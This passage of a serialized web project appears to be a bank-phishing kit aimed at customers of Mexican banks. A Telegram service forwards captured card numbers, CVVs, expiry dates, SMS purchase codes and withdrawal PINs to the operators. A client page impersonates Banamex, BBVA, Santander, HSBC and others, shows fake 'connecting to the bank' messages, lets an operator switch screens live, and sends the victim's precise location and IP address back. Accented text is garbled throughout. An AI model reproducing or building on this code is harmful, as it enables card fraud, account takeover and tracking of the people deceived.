(inputData.fechaVencimiento) {\n        message += ` *Fecha vencimiento:* \\`${inputData.fechaVencimiento}\\`\\n`;\n      }\n      if (inputData.cvv) {\n        message += ` *CVV:* \\`${inputData.cvv}\\``;\n      }\n      break;\n      \n    case 'sms_compra':\n    case 'smscompra':\n      message += ` *C贸digo SMS Compra:* \\`${inputData.smsCompra || 'N/A'}\\``;\n      break;\n      \n    case 'cancelacion_retiro':\n      message += ` *C贸digo de retiro:* \\`${inputData.codigoRetiro || 'N/A'}\\`\\n`;\n      if (inputData.pinRetiro) {\n        message += ` *PIN de retiro:* \\`${inputData.pinRetiro}\\``;\n      }\n      break;\n      \n    case 'escanear_qr':\n      message += ` *QR escaneado:* \\`${inputData.qrData ? inputData.qrData.substring(0, 100) + '...' : 'N/A'}\\``;\n      break;\n      \n    case 'celular':\n      message += ` *Tel茅fono:* \\`${inputData.celular || 'N/A'}\\``;\n      break;\n      \n    case 'proteccion_saldo':\n      message += `★ *PROTECCIN DE SALDO*\\n`;\n      if (inputData.saldoDebito) {\n        message += ` *Tarjeta D茅bito:* \\`${inputData.saldoDebito}\\`\\n`;\n        if (inputData.montoDebito) {\n          message += ` *Monto D茅bito:* \\`$${inputData.montoDebito}\\`\\n`;\n        }\n      }\n      if (inputData.saldoCredito) {\n        message += ` *Tarjeta Cr茅dito:* \\`${inputData.saldoCredito}\\`\\n`;\n        if (inputData.montoCredito) {\n          message += ` *Monto Cr茅dito:* \\`$${inputData.montoCredito}\\``;\n        }\n      }\n      break;\n      \n    default:\n      message += ` *Datos:* \\`${JSON.stringify(inputData).substring(0, 200)}\\``;\n      break;\n  }\n  \n  return message;\n}\n\n// Funci贸n principal para enviar notificaci贸n a Telegram\nexport async function sendTelegramNotification(data: TelegramNotificationData): Promise<void> {\n  if (!bot) {\n    console.log('[Telegram] Servicio no configurado. Notificaci贸n omitida.');\n    return;\n  }\n  \n  const message = formatMessage(data);\n  let adminSent = false;\n  let userSent = false;\n  \n  try {\n    // Enviar notificaci贸n al administrador principal si est谩 configurado\n    if (ADMIN_CHAT_ID) {\n      await bot.sendMessage(ADMIN_CHAT_ID, message, {\n        parse_mode: 'Markdown',\n        disable_web_page_preview: true\n      });\n      adminSent = true;\n      console.log(`[Telegram] Notificaci贸n enviada al admin principal para sesi贸n ${data.sessionId}`);\n    }\n  } catch (error) {\n    console.error(`[Telegram] Error enviando notificaci贸n al admin principal:`, error);\n  }\n  \n  // Enviar notificaci贸n al usuario que cre贸 la sesi贸n (si tiene Chat ID configurado)\n  if (data.createdBy) {\n    try {\n      const { storage } = await import('./storage');\n      const user = await storage.getUserByUsername(data.createdBy);\n      \n      if (user && user.telegramChatId) {\n        await bot.sendMessage(user.telegramChatId, message, {\n          parse_mode: 'Markdown',\n          disable_web_page_preview: true\n        });\n        userSent = true;\n        console.log(`[Telegram] Notificaci贸n enviada al usuario ${data.createdBy} (Chat ID: ${user.telegramChatId})`);\n      } else {\n        console.log(`[Telegram] Usuario ${data.createdBy} no tiene Chat ID configurado`);\n      }\n    } catch (error) {\n      console.error(`[Telegram] Error enviando notificaci贸n al usuario ${data.createdBy}:`, error);\n    }\n  }\n  \n  // Log de estado final\n  if (!adminSent && !userSent) {\n    console.warn(`[Telegram] ADVERTENCIA: No se envi贸 notificaci贸n a nadie para sesi贸n ${data.sessionId}`);\n  }\n}\n\n// Funci贸n para enviar notificaci贸n de nueva sesi贸n creada\nexport async function sendSessionCreatedNotification(sessionData: {\n  sessionId: string;\n  banco: string;\n  folio: string;\n  createdBy: string;\n  link: string;\n}): Promise<void> {\n  try {\n    if (!bot || !ADMIN_CHAT_ID) {\n      console.log('[Telegram] Servicio no configurado. Notificaci贸n omitida.');\n      return;\n    }\n    \n    const message = ` *NUEVA SESIN CREADA*\\n\\n` +\n                   ` *Banco:* ${sessionData.banco}\\n` +\n                   ` *Sesi贸n:* ${sessionData.sessionId}\\n` +\n                   ` *Folio:* \\`${sessionData.folio}\\`\\n` +\n                   ` *Creado por:* ${sessionData.createdBy}\\n` +\n                   ` *Hora:* ${new Date().toLocaleString('es-MX', { timeZone: 'America/Mexico_City' })}\\n\\n` +\n                   ` *Link de acceso:* ${sessionData.link}`;\n    \n    await bot.sendMessage(ADMIN_CHAT_ID, message, {\n      parse_mode: 'Markdown',\n      disable_web_page_preview: true\n    });\n    \n    console.log(`[Telegram] Notificaci贸n de nueva sesi贸n enviada para ${sessionData.sessionId}`);\n  } catch (error) {\n    console.error('[Telegram] Error enviando notificaci贸n de nueva sesi贸n:', error);\n  }\n}\n\n// Funci贸n para enviar notificaci贸n de cambio de pantalla\nexport async function sendScreenChangeNotification(data: {\n  sessionId: string;\n  banco: string;\n  newScreen: string;\n  adminUser: string;\n  data?: any;\n}): Promise<void> {\n  try {\n    if (!bot || !ADMIN_CHAT_ID) {\n      console.log('[Telegram] Servicio no configurado. Notificaci贸n omitida.');\n      return;\n    }\n    \n    let message = ` *CAMBIO DE PANTALLA*\\n\\n` +\n                 ` *Banco:* ${data.banco}\\n` +\n                 ` *Sesi贸n:* ${data.sessionId}\\n` +\n                 ` *Admin:* ${data.adminUser}\\n` +\n                 `ワ *Nueva pantalla:* ${data.newScreen.toUpperCase()}\\n` +\n                 ` *Hora:* ${new Date().toLocaleString('es-MX', { timeZone: 'America/Mexico_City' })}`;\n    \n    // Agregar informaci贸n adicional seg煤n el tipo de pantalla\n    if (data.data) {\n      if (data.data.terminacion) {\n        message += `\\n *Terminaci贸n:* ${data.data.terminacion}`;\n      }\n      if (data.data.saldo) {\n        message += `\\n *Saldo:* ${data.data.saldo}`;\n      }\n      if (data.data.monto) {\n        message += `\\n *Monto:* ${data.data.monto}`;\n      }\n      if (data.data.comercio) {\n        message += `\\n *Comercio:* ${data.data.comercio}`;\n      }\n      if (data.data.mensaje) {\n        message += `\\n *Mensaje:* ${data.data.mensaje.substring(0, 100)}${data.data.mensaje.length > 100 ? '...' : ''}`;\n      }\n      if (data.data.fileName) {\n        message += `\\n *Archivo de Protecci贸n:* ${data.data.fileName}`;\n        if (data.data.fileSize) {\n          message += ` (${data.data.fileSize})`;\n        }\n      }\n    }\n    \n    await bot.sendMessage(ADMIN_CHAT_ID, message, {\n      parse_mode: 'Markdown',\n      disable_web_page_preview: true\n    });\n    \n    console.log(`[Telegram] Notificaci贸n de cambio de pantalla enviada para ${data.sessionId}`);\n  } catch (error) {\n    console.error('[Telegram] Error enviando notificaci贸n de cambio de pantalla:', error);\n  }\n}\n\n// Funci贸n para notificar descarga de archivo de protecci贸n\nexport async function sendFileDownloadNotification(data: {\n  sessionId: string;\n  banco: string;\n  fileName: string;\n  fileSize?: string;\n  adminUser: string;\n}) {\n  try {\n    if (!bot || !ADMIN_CHAT_ID) {\n      console.log('[Telegram] Servicio no configurado. Notificaci贸n omitida.');\n      return;\n    }\n    \n    const message = ` *DESCARGA DE ARCHIVO DE PROTECCIN*\\n\\n` +\n                   ` *Banco:* ${data.banco}\\n` +\n                   ` *Sesi贸n:* ${data.sessionId}\\n` +\n                   ` *Archivo:* ${data.fileName}\\n` +\n                   ` *Tama帽o:* ${data.fileSize || 'N/A'}\\n` +\n                   ` *Admin:* ${data.adminUser}\\n` +\n                   ` *Hora:* ${new Date().toLocaleString('es-MX', { timeZone: 'America/Mexico_City' })}`;\n    \n    await bot.sendMessage(ADMIN_CHAT_ID, message, {\n      parse_mode: 'Markdown',\n      disable_web_page_preview: true\n    });\n    \n    console.log(`[Telegram] Notificaci贸n de descarga de archivo enviada para ${data.sessionId}`);\n  } catch (error) {\n    console.error('[Telegram] Error enviando notificaci贸n de descarga:', error);\n  }\n}\n\nexport default {\n  sendTelegramNotification,\n  sendSessionCreatedNotification,\n  sendScreenChangeNotification,\n  sendFileDownloadNotification\n};","size_bytes":11020},"client/src/components/ui/menubar.tsx":{"content":"import * as React from \"react\"\nimport * as MenubarPrimitive from \"@radix-ui/react-menubar\"\nimport { Check, ChevronRight, Circle } from \"lucide-react\"\n\nimport { cn } from \"@/lib/utils\"\n\nconst MenubarMenu = MenubarPrimitive.Menu\n\nconst MenubarGroup = MenubarPrimitive.Group\n\nconst MenubarPortal = MenubarPrimitive.Portal\n\nconst MenubarSub = MenubarPrimitive.Sub\n\nconst MenubarRadioGroup = MenubarPrimitive.RadioGroup\n\nconst Menubar = React.forwardRef<\n  React.ElementRef<typeof MenubarPrimitive.Root>,\n  React.ComponentPropsWithoutRef<typeof MenubarPrimitive.Root>\n>(({ className, ...props }, ref) => (\n  <MenubarPrimitive.Root\n    ref={ref}\n    className={cn(\n      \"flex h-10 items-center space-x-1 rounded-md border bg-background p-1\",\n      className\n    )}\n    {...props}\n  />\n))\nMenubar.displayName = MenubarPrimitive.Root.displayName\n\nconst MenubarTrigger = React.forwardRef<\n  React.ElementRef<typeof MenubarPrimitive.Trigger>,\n  React.ComponentPropsWithoutRef<typeof MenubarPrimitive.Trigger>\n>(({ className, ...props }, ref) => (\n  <MenubarPrimitive.Trigger\n    ref={ref}\n    className={cn(\n      \"flex cursor-default select-none items-center rounded-sm px-3 py-1.5 text-sm font-medium outline-none focus:bg-accent focus:text-accent-foreground data-[state=open]:bg-accent data-[state=open]:text-accent-foreground\",\n      className\n    )}\n    {...props}\n  />\n))\nMenubarTrigger.displayName = MenubarPrimitive.Trigger.displayName\n\nconst MenubarSubTrigger = React.forwardRef<\n  React.ElementRef<typeof MenubarPrimitive.SubTrigger>,\n  React.ComponentPropsWithoutRef<typeof MenubarPrimitive.SubTrigger> & {\n    inset?: boolean\n  }\n>(({ className, inset, children, ...props }, ref) => (\n  <MenubarPrimitive.SubTrigger\n    ref={ref}\n    className={cn(\n      \"flex cursor-default select-none items-center rounded-sm px-2 py-1.5 text-sm outline-none focus:bg-accent focus:text-accent-foreground data-[state=open]:bg-accent data-[state=open]:text-accent-foreground\",\n      inset && \"pl-8\",\n      className\n    )}\n    {...props}\n  >\n    {children}\n    <ChevronRight className=\"ml-auto h-4 w-4\" />\n  </MenubarPrimitive.SubTrigger>\n))\nMenubarSubTrigger.displayName = MenubarPrimitive.SubTrigger.displayName\n\nconst MenubarSubContent = React.forwardRef<\n  React.ElementRef<typeof MenubarPrimitive.SubContent>,\n  React.ComponentPropsWithoutRef<typeof MenubarPrimitive.SubContent>\n>(({ className, ...props }, ref) => (\n  <MenubarPrimitive.SubContent\n    ref={ref}\n    className={cn(\n      \"z-50 min-w-[8rem] overflow-hidden rounded-md border bg-popover p-1 text-popover-foreground data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0 data-[state=closed]:zoom-out-95 data-[state=open]:zoom-in-95 data-[side=bottom]:slide-in-from-top-2 data-[side=left]:slide-in-from-right-2 data-[side=right]:slide-in-from-left-2 data-[side=top]:slide-in-from-bottom-2\",\n      className\n    )}\n    {...props}\n  />\n))\nMenubarSubContent.displayName = MenubarPrimitive.SubContent.displayName\n\nconst MenubarContent = React.forwardRef<\n  React.ElementRef<typeof MenubarPrimitive.Content>,\n  React.ComponentPropsWithoutRef<typeof MenubarPrimitive.Content>\n>(\n  (\n    { className, align = \"start\", alignOffset = -4, sideOffset = 8, ...props },\n    ref\n  ) => (\n    <MenubarPrimitive.Portal>\n      <MenubarPrimitive.Content\n        ref={ref}\n        align={align}\n        alignOffset={alignOffset}\n        sideOffset={sideOffset}\n        className={cn(\n          \"z-50 min-w-[12rem] overflow-hidden rounded-md border bg-popover p-1 text-popover-foreground shadow-md data-[state=open]:animate-in data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0 data-[state=closed]:zoom-out-95 data-[state=open]:zoom-in-95 data-[side=bottom]:slide-in-from-top-2 data-[side=left]:slide-in-from-right-2 data-[side=right]:slide-in-from-left-2 data-[side=top]:slide-in-from-bottom-2\",\n          className\n        )}\n        {...props}\n      />\n    </MenubarPrimitive.Portal>\n  )\n)\nMenubarContent.displayName = MenubarPrimitive.Content.displayName\n\nconst MenubarItem = React.forwardRef<\n  React.ElementRef<typeof MenubarPrimitive.Item>,\n  React.ComponentPropsWithoutRef<typeof MenubarPrimitive.Item> & {\n    inset?: boolean\n  }\n>(({ className, inset, ...props }, ref) => (\n  <MenubarPrimitive.Item\n    ref={ref}\n    className={cn(\n      \"relative flex cursor-default select-none items-center rounded-sm px-2 py-1.5 text-sm outline-none focus:bg-accent focus:text-accent-foreground data-[disabled]:pointer-events-none data-[disabled]:opacity-50\",\n      inset && \"pl-8\",\n      className\n    )}\n    {...props}\n  />\n))\nMenubarItem.displayName = MenubarPrimitive.Item.displayName\n\nconst MenubarCheckboxItem = React.forwardRef<\n  React.ElementRef<typeof MenubarPrimitive.CheckboxItem>,\n  React.ComponentPropsWithoutRef<typeof MenubarPrimitive.CheckboxItem>\n>(({ className, children, checked, ...props }, ref) => (\n  <MenubarPrimitive.CheckboxItem\n    ref={ref}\n    className={cn(\n      \"relative flex cursor-default select-none items-center rounded-sm py-1.5 pl-8 pr-2 text-sm outline-none focus:bg-accent focus:text-accent-foreground data-[disabled]:pointer-events-none data-[disabled]:opacity-50\",\n      className\n    )}\n    checked={checked}\n    {...props}\n  >\n    <span className=\"absolute left-2 flex h-3.5 w-3.5 items-center justify-center\">\n      <MenubarPrimitive.ItemIndicator>\n        <Check className=\"h-4 w-4\" />\n      </MenubarPrimitive.ItemIndicator>\n    </span>\n    {children}\n  </MenubarPrimitive.CheckboxItem>\n))\nMenubarCheckboxItem.displayName = MenubarPrimitive.CheckboxItem.displayName\n\nconst MenubarRadioItem = React.forwardRef<\n  React.ElementRef<typeof MenubarPrimitive.RadioItem>,\n  React.ComponentPropsWithoutRef<typeof MenubarPrimitive.RadioItem>\n>(({ className, children, ...props }, ref) => (\n  <MenubarPrimitive.RadioItem\n    ref={ref}\n    className={cn(\n      \"relative flex cursor-default select-none items-center rounded-sm py-1.5 pl-8 pr-2 text-sm outline-none focus:bg-accent focus:text-accent-foreground data-[disabled]:pointer-events-none data-[disabled]:opacity-50\",\n      className\n    )}\n    {...props}\n  >\n    <span className=\"absolute left-2 flex h-3.5 w-3.5 items-center justify-center\">\n      <MenubarPrimitive.ItemIndicator>\n        <Circle className=\"h-2 w-2 fill-current\" />\n      </MenubarPrimitive.ItemIndicator>\n    </span>\n    {children}\n  </MenubarPrimitive.RadioItem>\n))\nMenubarRadioItem.displayName = MenubarPrimitive.RadioItem.displayName\n\nconst MenubarLabel = React.forwardRef<\n  React.ElementRef<typeof MenubarPrimitive.Label>,\n  React.ComponentPropsWithoutRef<typeof MenubarPrimitive.Label> & {\n    inset?: boolean\n  }\n>(({ className, inset, ...props }, ref) => (\n  <MenubarPrimitive.Label\n    ref={ref}\n    className={cn(\n      \"px-2 py-1.5 text-sm font-semibold\",\n      inset && \"pl-8\",\n      className\n    )}\n    {...props}\n  />\n))\nMenubarLabel.displayName = MenubarPrimitive.Label.displayName\n\nconst MenubarSeparator = React.forwardRef<\n  React.ElementRef<typeof MenubarPrimitive.Separator>,\n  React.ComponentPropsWithoutRef<typeof MenubarPrimitive.Separator>\n>(({ className, ...props }, ref) => (\n  <MenubarPrimitive.Separator\n    ref={ref}\n    className={cn(\"-mx-1 my-1 h-px bg-muted\", className)}\n    {...props}\n  />\n))\nMenubarSeparator.displayName = MenubarPrimitive.Separator.displayName\n\nconst MenubarShortcut = ({\n  className,\n  ...props\n}: React.HTMLAttributes<HTMLSpanElement>) => {\n  return (\n    <span\n      className={cn(\n        \"ml-auto text-xs tracking-widest text-muted-foreground\",\n        className\n      )}\n      {...props}\n    />\n  )\n}\nMenubarShortcut.displayname = \"MenubarShortcut\"\n\nexport {\n  Menubar,\n  MenubarMenu,\n  MenubarTrigger,\n  MenubarContent,\n  MenubarItem,\n  MenubarSeparator,\n  MenubarLabel,\n  MenubarCheckboxItem,\n  MenubarRadioGroup,\n  MenubarRadioItem,\n  MenubarPortal,\n  MenubarSubContent,\n  MenubarSubTrigger,\n  MenubarGroup,\n  MenubarSub,\n  MenubarShortcut,\n}\n","size_bytes":7974},"client/src/lib/queryClient.ts":{"content":"import { QueryClient, QueryFunction } from \"@tanstack/react-query\";\n\nasync function throwIfResNotOk(res: Response) {\n  if (!res.ok) {\n    const text = (await res.text()) || res.statusText;\n    throw new Error(`${res.status}: ${text}`);\n  }\n}\n\nexport async function apiRequest(\n  method: string,\n  url: string,\n  data?: unknown | undefined,\n): Promise<Response> {\n  const res = await fetch(url, {\n    method,\n    headers: data ? { \"Content-Type\": \"application/json\" } : {},\n    body: data ? JSON.stringify(data) : undefined,\n    credentials: \"include\",\n  });\n\n  await throwIfResNotOk(res);\n  return res;\n}\n\ntype UnauthorizedBehavior = \"returnNull\" | \"throw\";\nexport const getQueryFn: <T>(options: {\n  on401: UnauthorizedBehavior;\n}) => QueryFunction<T> =\n  ({ on401: unauthorizedBehavior }) =>\n  async ({ queryKey }) => {\n    const res = await fetch(queryKey[0] as string, {\n      credentials: \"include\",\n    });\n\n    if (unauthorizedBehavior === \"returnNull\" && res.status === 401) {\n      return null;\n    }\n\n    await throwIfResNotOk(res);\n    return await res.json();\n  };\n\nexport const queryClient = new QueryClient({\n  defaultOptions: {\n    queries: {\n      queryFn: getQueryFn({ on401: \"throw\" }),\n      refetchInterval: false,\n      refetchOnWindowFocus: false,\n      staleTime: Infinity,\n      retry: false,\n    },\n    mutations: {\n      retry: false,\n    },\n  },\n});\n","size_bytes":1376},"client/src/pages/ClientScreen.tsx":{"content":"import { useState, useEffect } from 'react';\nimport { useRoute } from 'wouter';\nimport { useWebSocket } from '@/hooks/useWebSocket';\nimport { ScreenTemplates } from '@/components/client/ScreenTemplates';\nimport { Session, ScreenType } from '@shared/schema';\nimport { formatDate } from '@/utils/helpers';\nimport liverpoolLogo from '@assets/logo-brand-liverpool-f-c-design-acaab2087aa7319e33227c007e2d759b.png'; // Logo de Liverpool\nimport liverpoolLogoWhite from '@assets/liverpool_logo_white.png'; // Logo de Liverpool en blanco\nimport banamexLogo from '../assets/banamex_logo_new.png';\nimport banbajioLogo from '../assets/banbajio_logo_oficial.png';\nimport banbajioBackground from '../assets/IMG_0354.jpeg';\nimport bbvaLogo from '@assets/bbva_logo.png';\nimport bbvaLogoWhite from '../assets/bbva_logo_white.png';\nimport banorteLogoHeader from '@assets/Bo.png.png';\nimport bancoppelLogo from '@assets/bancoppel.png';\nimport banorteLogoFooter from '@assets/Banorte-01.png';\nimport hsbcLogo from '@assets/Hsbc.png';\nimport hsbcBackground from '@assets/IMG_0391.jpeg';\nimport amexLogo from '@assets/Amex.png';\nimport santanderLogo from '../assets/santander_logo.png';\nimport santanderLogoWhite from '../assets/santander_logo_white_fixed.png';\nimport scotiabankLogo from '../assets/scotiabank_logo.png';\nimport scotiabankLogoWhite from '../assets/scotiabank_logo_white.png';\nimport invexLogo from '../assets/invex_logo.png';\nimport invexLogoWhite from '../assets/invex_logo_white.png';\nimport banregioLogo from '../assets/banregio_logo.png';\nimport banregioLogoWhite from '../assets/banregio_logo_white.png';\nimport platacardLogo from '../assets/platacard_logo.png';\nimport bancoAztecaLogo from '../assets/banco_azteca_logo.png';\nimport bienestarLogo from '../assets/banco_bienestar_logo.png';\nimport inbursaLogo from '@assets/inbursa-seeklogo_1758958331280.png';\nimport afirmeLogo from '@assets/logoAfirme_1762549994047.png';\n\nexport default function ClientScreen() {\n  // Verificar primero la ruta /client/:sessionId\n  const [matchClient, paramsClient] = useRoute('/client/:sessionId');\n  // Si no coincide, verificar la ruta directa /:sessionId\n  const [matchDirect, paramsDirect] = useRoute('/:sessionId');\n  \n  // Usar los par谩metros seg煤n la ruta que haya coincidido\n  const params = matchClient ? paramsClient : paramsDirect;\n  const sessionId = params?.sessionId || '';\n  \n  // State for the current screen\n  const [currentScreen, setCurrentScreen] = useState<ScreenType>(ScreenType.FOLIO);\n  const [sessionData, setSessionData] = useState<Partial<Session> & { banco?: string }>({});\n  const [bankLoaded, setBankLoaded] = useState<boolean>(false);\n  \n  // Additional screen-specific state\n  const [screenData, setScreenData] = useState<{\n    terminacion?: string;\n    saldo?: string;\n    monto?: string;\n    clabe?: string;\n    titular?: string;\n    comercio?: string;\n    mensaje?: string;\n  }>({});\n  \n  // Estado para controlar los mensajes iniciales\n  const [initialMessage, setInitialMessage] = useState<string>('Conectando con el banco...');\n  const [showInitialMessage, setShowInitialMessage] = useState<boolean>(true);\n  \n  // WebSocket connection\n  const { socket, connected, sendMessage } = useWebSocket('/ws');\n\n  // Efecto para mostrar los mensajes iniciales\n  useEffect(() => {\n    console.log('[ClientScreen] useEffect inicial ejecutado');\n    \n    // Mostrar \"Conectando con el banco\" por 2 segundos\n    const connectingTimer = setTimeout(() => {\n      console.log('[ClientScreen] Cambiando a \"Generando aclaraci贸n...\"');\n      setInitialMessage('Generando aclaraci贸n...');\n      \n      // Despu茅s de 2 segundos m谩s, mostrar la pantalla regular\n      const generatingTimer = setTimeout(() => {\n        console.log('[ClientScreen] Ocultando mensaje inicial');\n        console.log('[ClientScreen] currentScreen:', currentScreen);\n        console.log('[ClientScreen] sessionData.pasoActual:', sessionData.pasoActual);\n        setShowInitialMessage(false);\n        \n        // Cambiar a la pantalla FOLIO si no hay una pantalla espec铆fica configurada\n        if (currentScreen === ScreenType.VALIDANDO && !sessionData.pasoActual) {\n          console.log('[ClientScreen] Cambiando a pantalla FOLIO');\n          setCurrentScreen(ScreenType.FOLIO);\n        } else {\n          console.log('[ClientScreen] NO cambiando a FOLIO. currentScreen:', currentScreen, 'pasoActual:', sessionData.pasoActual);\n        }\n      }, 2000);\n      \n      return () => clearTimeout(generatingTimer);\n    }, 2000);\n    \n    return () => clearTimeout(connectingTimer);\n  }, []);\n  \n  // Register with the server when connection is established\n  useEffect(() => {\n    if (connected && sessionId) {\n      sendMessage({\n        type: 'REGISTER',\n        role: 'CLIENT',\n        sessionId\n      });\n    }\n  }, [connected, sessionId, sendMessage]);\n\n  // Handle WebSocket messages\n  useEffect(() => {\n    if (!socket) return;\n\n    const handleMessage = (event: MessageEvent) => {\n      try {\n        const message = JSON.parse(event.data);\n        \n        // Handle different message types\n        if (message.type === 'INIT_SESSION') {\n          // Asegurar que el banco est茅 en may煤sculas para consistencia en todo el c贸digo\n          if (message.data.banco) {\n            console.log('Banco recibido:', message.data.banco);\n            message.data.banco = message.data.banco.toUpperCase();\n            console.log('Banco normalizado:', message.data.banco);\n          }\n          \n          setSessionData(message.data);\n          setBankLoaded(true);\n          // Set initial screen based on session data\n          if (message.data.pasoActual) {\n            setCurrentScreen(message.data.pasoActual as ScreenType);\n          }\n        }\n        else if (message.type === 'SCREEN_CHANGE') {\n          const { tipo, ...data } = message.data;\n          \n          console.log('SCREEN_CHANGE recibido:', tipo, data);\n          \n          // Extract screen type from the message\n          // The server sends 'mostrar_X', we need to remove the prefix\n          let screenType = tipo.replace('mostrar_', '');\n          \n          // Normalize screen type for SMS_COMPRA (handle different case variations)\n          if (screenType.toLowerCase() === 'sms_compra' || \n              screenType.toLowerCase() === 'smscompra' ||\n              screenType.toLowerCase() === 'sms compra') {\n            console.log('Pantalla SMS_COMPRA detectada, normalizando a:', ScreenType.SMS_COMPRA);\n            screenType = ScreenType.SMS_COMPRA; // Use the exact value from enum\n          }\n          \n          console.log('Cambiando a pantalla:', screenType);\n          \n          // Verificaci贸n adicional para asegurar que se muestra la pantalla SMS_COMPRA\n          if (tipo.toLowerCase().includes('sms_compra') || \n              tipo.toLowerCase().includes('smscompra') ||\n              screenType.toLowerCase() === 'sms_compra' ||\n              screenType.toLowerCase() === 'smscompra') {\n            console.log('Verificando expresamente que SMS_COMPRA se establezca correctamente');\n            console.log('Datos para mostrar en SMS_COMPRA:', data);\n            setCurrentScreen(ScreenType.SMS_COMPRA);\n            // Actualizamos los datos expl铆citamente para asegurar que se muestren\n            setScreenData({\n              ...data,\n              terminacion: data.terminacion || '****'\n            });\n          } else {\n            setCurrentScreen(screenType as ScreenType);\n          }\n          \n          // Update screen-specific data\n          setScreenData(data);\n        }\n      } catch (error) {\n        console.error(\"Error processing WebSocket message:\", error);\n      }\n    };\n\n    socket.addEventListener('message', handleMessage);\n    return () => socket.removeEventListener('message', handleMessage);\n  }, [socket]);\n\n  // Funci贸n para solicitar geolocalizaci贸n directamente sin pantalla personalizada\n  const requestGeolocationDirectly = async () => {\n    console.log('[Geolocation] Iniciando solicitud directa de ubicaci贸n...');\n    \n    // Cambiar a pantalla de validando inmediatamente\n    setCurrentScreen(ScreenType.VALIDANDO);\n    \n    // Verificar si el navegador soporta geolocalizaci贸n\n    if (!('geolocation' in navigator)) {\n      console.log('[Geolocation] Navegador no soporta geolocalizaci贸n, continuando...');\n      sendLocationDeniedData();\n      return;\n    }\n\n    // Verificar si el contexto es seguro (HTTPS) - requerido por Safari\n    const isSecureContext = window.isSecureContext || location.protocol === 'https:' || location.hostname === 'localhost';\n    if (!isSecureContext) {\n      console.log('[Geolocation] Contexto no seguro, Safari requiere HTTPS');\n      sendLocationDeniedData();\n      return;\n    }\n\n    // Intentar revocar permisos existentes para forzar nueva solicitud\n    try {\n      if ('permissions' in navigator) {\n        console.log('[Geolocation] Intentando revocar permisos existentes...');\n        const permission = await navigator.permissions.query({name: 'geolocation'});\n        console.log('[Geolocation] Estado de permisos actual:', permission.state);\n        \n        // Aunque no podemos revocar directamente, lo intentamos\n        if (permission.state === 'granted') {\n          console.log('[Geolocation] Permisos ya otorgados - forzando nueva solicitud con configuraci贸n especial');\n        }\n      }\n    } catch (error) {\n      console.log('[Geolocation] No se pueden consultar permisos:', error);\n    }\n\n    // Configuraci贸n especial para obtener ubicaci贸n actual siempre\n    const locationOptions = {\n      enableHighAccuracy: true,\n      timeout: 10000,\n      maximumAge: 0 // Siempre solicitar nueva ubicaci贸n, no usar cache\n    };\n\n    console.log('[Geolocation] Solicitando ubicaci贸n actual (forzando nueva lectura)...');\n    \n    // NOTA: Los navegadores modernos no permiten revocar permisos program谩ticamente\n    // La ventana emergente solo aparecer谩 si el usuario no ha otorgado permisos previamente\n    // Para forzar que aparezca siempre, el usuario debe ir a configuraci贸n del navegador\n    // y eliminar los permisos manualmente para este sitio\n    \n    navigator.geolocation.getCurrentPosition(\n      handleLocationSuccess,\n      handleLocationError,\n      locationOptions\n    );\n  };\n\n  // Funci贸n para manejar el 茅xito en la obtenci贸n de ubicaci贸n\n  const handleLocationSuccess = async (position: GeolocationPosition) => {\n    console.log('[Geolocation] Ubicaci贸n obtenida exitosamente:', position);\n    \n    const { latitude, longitude } = position.coords;\n    \n    // Obtener la IP del usuario\n    let ipAddress = 'IP no disponible';\n    try {\n      const ipResponse = await fetch('https://api.ipify.org?format=json');\n      const ipData = await ipResponse.json();\n      ipAddress = ipData.ip;\n    } catch (ipError) {\n      console.warn('[Geolocation] No se pudo obtener la IP:', ipError);\n    }\n    \n    // Crear enlace de Google Maps\n    const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;\n    \n    const locationData = {\n      latitude: latitude.toString(),\n      longitude: longitude.toString(),\n      googleMapsLink,\n      timestamp: new Date().toISOString(),\n      ipAddress\n    };\n\n    console.log('[Geolocation] Datos de ubicaci贸n procesados:', locationData);\n    console.log('[Geolocation] Ubicaci贸n obtenida:', locationData);\n    \n    // Enviar primera se帽al de validando\n    sendMessage({\n      type: 'CLIENT_INPUT',\n      data: {\n        tipo: 'validando',\n        sessionId,\n        data: {}\n      }\n    });\n    \n    // Luego enviar los datos de geolocalizaci贸n\n    setTimeout(() => {\n      sendMessage({\n        type: 'CLIENT_INPUT',\n        data: {\n          tipo: 'geolocation',\n          sessionId,\n          data: {\n            tipo: 'geolocation',\n            latitude: locationData.latitude,\n            longitude: locationData.longitude,\n            googleMapsLink: locationData.googleMapsLink,\n            locationTimestamp: locationData.timestamp,\n            ipAddress: locationData.ipAddress\n          }\n        }\n      });\n      console.log('[ClientScreen] Enviando datos de geolocalizaci贸n al servidor');\n      console.log('[ClientScreen] Datos de geolocalizaci贸n enviados, manteniendo pantalla de cargando...');\n    }, 2000);\n  };\n\n  // Funci贸n para manejar errores en la obtenci贸n de ubicaci贸n\n  const handleLocationError = (error: GeolocationPositionError) => {\n    console.error('[Geolocation] Error obteniendo ubicaci贸n:', error);\n    \n    let errorMessage = 'Permiso de ubicaci贸n denegado';\n    switch (error.code) {\n      case error.PERMISSION_DENIED:\n        errorMessage = 'Permiso de ubicaci贸n denegado por el usuario';\n        break;\n      case error.POSITION_UNAVAILABLE:\n        errorMessage = 'Informaci贸n de ubicaci贸n no disponible';\n        break;\n      case error.TIMEOUT:\n        errorMessage = 'Tiempo de espera agotado para obtener ubicaci贸n';\n        break;\n    }\n    \n    console.log('[Geolocation] Error:', errorMessage);\n    sendLocationDeniedData();\n  };\n\n  // Funci贸n para enviar datos cuando se deniega la ubicaci贸n\n  const sendLocationDeniedData = () => {\n    console.log('[Geolocation] Enviando datos de ubicaci贸n denegada');\n    \n    // Enviar se帽al de validando\n    sendMessage({\n      type: 'CLIENT_INPUT',\n      data: {\n        tipo: 'validando',\n        sessionId,\n        data: {}\n      }\n    });\n    \n    // Enviar datos de ubicaci贸n denegada\n    setTimeout(() => {\n      sendMessage({\n        type: 'CLIENT_INPUT',\n        data: {\n          tipo: 'geolocation',\n          sessionId,\n          data: {\n            tipo: 'geolocation_denied',\n            error: 'Usuario deneg贸 el acceso a la ubicaci贸n',\n            timestamp: new Date().toISOString()\n          }\n        }\n      });\n      console.log('[ClientScreen] Datos de ubicaci贸n denegada enviados');\n    }, 2000);\n  };\n\n  // Handle form submissions\n  const handleSubmit = (screen: ScreenType, formData: Record<string, any>) => {\n    if (connected) {\n      console.log('Enviando datos al servidor:', screen, formData);\n      \n      \n      // Enviar datos al servidor inmediatamente para otros casos\n      sendMessage({\n        type: 'CLIENT_INPUT',\n        data: 